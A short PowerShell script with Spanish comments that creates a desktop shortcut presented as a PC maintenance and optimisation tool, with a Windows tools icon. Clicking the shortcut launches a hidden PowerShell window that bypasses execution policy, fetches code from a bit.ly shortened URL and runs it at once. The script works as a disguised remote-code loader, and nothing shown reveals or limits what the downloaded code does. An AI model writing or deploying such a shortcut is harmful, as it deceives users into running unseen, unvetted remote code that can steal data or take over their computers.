# Script para crear el acceso directo al mantenimiento remoto
Add-Type -AssemblyName System.Windows.Forms, PresentationFramework

$Desktop = [System.Environment]::GetFolderPath('Desktop')
$ShortcutPath = Join-Path $Desktop "Mantenimiento Antony Dapier.lnk"

# Borrar si existe para evitar conflictos
if (Test-Path $ShortcutPath) { Remove-Item $ShortcutPath -Force }

$WshShell = New-Object -ComObject WScript.Shell
$Shortcut = $WshShell.CreateShortcut($ShortcutPath)

# TargetPath a PowerShell oficial para que el ICONO se vea bien de inmediato
$Shortcut.TargetPath = "powershell.exe"
$Shortcut.Arguments = "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command ""iex (irm https://bit.ly/pc-mantenimiento-diario)"""

$Shortcut.IconLocation = "imageres.dll,109" # Icono de herramientas de Windows
$Shortcut.Description = "Mantenimiento y Optimización Antony Dapier"
$Shortcut.Save()

[System.Windows.Forms.MessageBox]::Show("¡Icono creado!`n`nUsa el acceso directo del escritorio para empezar.", "Antony Dapier")
